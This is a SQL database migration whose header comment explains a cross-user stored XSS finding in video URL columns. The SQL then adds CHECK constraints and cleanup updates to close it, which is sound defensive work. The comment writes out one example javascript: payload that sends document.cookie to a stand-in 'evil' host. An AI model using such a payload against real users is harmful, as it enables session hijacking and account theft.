-- ════════════════════════════════════════════════════════════════════
-- BASECAMP — 0007 security: video_url scheme/host CHECK constraints
--
-- Finding [HIGH — cross-user stored XSS]: program_days.video_url and
-- exercises.default_video_url are rendered DIRECTLY as anchor hrefs:
--   • src/app/(app)/today/page.tsx                       (own enrolled day)
--   • src/app/(app)/checkin/_components.tsx              (own check-in)
--   • src/app/(app)/programs/[id]/days/[dayId]/_components.tsx
--                                       (read-only view of a PUBLIC program)
--   • src/app/(app)/exercises/_components.tsx
--                                       (the PUBLIC, cross-user exercise list)
--
-- The write paths validate with validateVideoUrl()/safe_video_url(), and 0004
-- both sanitized clone_program() and backfilled existing rows. BUT 0004 never
-- added a CHECK constraint, so — unlike avatar_url (locked by a CHECK in
-- 0005_security_avatar_url.sql) — the DIRECT-to-PostgREST path was still open:
-- the anon/publishable key ships to the browser, and the owner-write RLS
-- policies (programs_*/program_days_write/exercises_write) let an authenticated
-- user PATCH/POST these columns to ANY value, including
--   default_video_url = 'javascript:fetch("https://evil/"+document.cookie)'
-- on a row they also flag is_public = true. exercises_select / the public-program
-- read policies then expose that row to EVERY other user, whose browser renders
-- it as <a href="javascript:…"> and executes it on click — cross-user stored XSS
-- (threat models B and C), bypassing the app-layer guard entirely.
--
-- This migration closes the hole at the database tier (defense-in-depth,
-- independent of the app server), exactly as 0005 did for avatar_url:
--   1) re-neutralize any dangerous value inserted since 0004's one-time backfill
--      (so the CHECK can be added cleanly and nothing hostile lingers);
--   2) add CHECK constraints requiring video_url / default_video_url to be NULL
--      or to pass the existing public.safe_video_url() guard
--      (https:// + host mtntough.com or a subdomain — the SQL mirror of
--      validateVideoUrl()).
--
-- safe_video_url() (from 0004) is IMMUTABLE with a pinned search_path, so it is
-- safe to use inside a CHECK constraint and cannot be redirected by a caller
-- shadowing `public`. No RLS policy is changed and no existing control is
-- weakened: NULL stays valid (UI shows "No video linked"), and every value the
-- app legitimately writes already satisfies the guard, so valid links and
-- clearing a link keep working. The constraints are dropped-if-exists first so
-- this migration is re-runnable.
-- ════════════════════════════════════════════════════════════════════

-- ── 1) Re-neutralize any dangerous values written since the 0004 backfill ──
-- (Idempotent: a no-op once the CHECKs below are in force; here to guarantee
-- the ALTER TABLE … ADD CONSTRAINT validates against clean data.)
update public.program_days
  set video_url = null
  where video_url is not null
    and public.safe_video_url(video_url) is null;

update public.exercises
  set default_video_url = null
  where default_video_url is not null
    and public.safe_video_url(default_video_url) is null;

-- ── 2) Enforce the scheme + host at the database tier ──────────────────────
-- NULL (no video) stays allowed; any non-null value must pass safe_video_url().
alter table public.program_days
  drop constraint if exists program_days_video_url_safe;
alter table public.program_days
  add constraint program_days_video_url_safe
  check (video_url is null or public.safe_video_url(video_url) is not null);

alter table public.exercises
  drop constraint if exists exercises_default_video_url_safe;
alter table public.exercises
  add constraint exercises_default_video_url_safe
  check (default_video_url is null or public.safe_video_url(default_video_url) is not null);
